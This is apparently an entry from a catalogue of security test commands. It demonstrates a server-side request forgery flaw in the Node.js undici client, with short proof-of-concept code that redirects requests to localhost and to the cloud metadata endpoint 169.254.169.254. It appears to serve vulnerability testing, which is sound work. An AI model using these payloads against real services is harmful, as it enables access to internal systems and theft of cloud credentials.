---
id: 123e4567-e89b-12d3-a456-426614174004
name: undici-request-ssrf-demo
type: command
executor: node
data: >-
  const undici = require("undici"); undici.request({origin:
  "http://example.com", pathname: "//127.0.0.1"});
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.224Z'
platforms:
  - Node.js
tags:
  - ssrf
  - demo
verified: false
validated: true
submitted: true
---

# undici-request-ssrf-demo

## Command

```javascript
const undici = require("undici");
undici.request({origin: "http://example.com", pathname: "//127.0.0.1"});
```

## Description

This Node.js command demonstrates the SSRF vulnerability in undici by making a request with a protocol-relative pathname, causing the request to target localhost instead of the specified origin.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| origin | Base URL intended to scope the request (e.g., 'http://example.com') | Yes |
| pathname | User-controlled path; malicious value like '//127.0.0.1' triggers SSRF | Yes |

## Examples

### Basic Usage

```javascript
const undici = require("undici");
undici.request({origin: "http://example.com", pathname: "//127.0.0.1"});
```

### Advanced Usage

```javascript
const undici = require("undici");
undici.request({
  origin: "http://example.com",
  pathname: "http://169.254.169.254/latest/meta-data/",
  method: "GET"
}).then(response => console.log(response));
```

## Expected Output

The request is sent to 'http://127.0.0.1/' (or the targeted internal endpoint), potentially returning data from internal services if accessible. No error is thrown, but network traces show the redirection.

## Related

- [[Related Procedure]]
